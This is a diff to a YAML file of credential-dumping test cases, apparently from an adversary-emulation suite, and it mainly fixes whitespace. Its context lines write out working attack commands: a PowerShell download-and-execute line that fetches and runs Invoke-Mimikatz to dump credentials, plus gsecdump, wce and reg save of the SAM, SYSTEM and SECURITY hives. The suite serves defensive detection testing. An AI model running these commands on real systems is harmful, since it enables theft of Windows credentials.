@@ -13,7 +13,7 @@ atomic_tests:
       description: URL to a remote Mimikatz script that dumps credentials
       type: Url
       default: https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1
-  executor: 
+  executor:
     name: powershell
     command: |
       IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
@@ -23,7 +23,7 @@ atomic_tests:
     https://www.truesec.se/sakerhet/verktyg/saakerhet/gsecdump_v2.0b5
   supported_platforms:
     - windows
-  executor: 
+  executor:
     name: command_prompt
     command: |
       gsecdump -a
@@ -33,26 +33,25 @@ atomic_tests:
     http://www.ampliasecurity.com/research/windows-credentials-editor/
   supported_platforms:
     - windows
-  input_argument:
+  input_arguments:
     output_file:
       description: Path where resulting data should be placed
       type: Path
       default: output.txt
-  executor: 
+  executor:
     name: command_prompt
     command: |
       wce -o #{output_file}
 
 - name: Registry dump of SAM, creds, and secrets
   description: |
-    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated 
+    Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
     via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
   supported_platforms:
     - windows
-  executor: 
+  executor:
     name: command_prompt
     command: |
-      reg save HKLM\sam sam 
+      reg save HKLM\sam sam
       reg save HKLM\system system
       reg save HKLM\security security
-
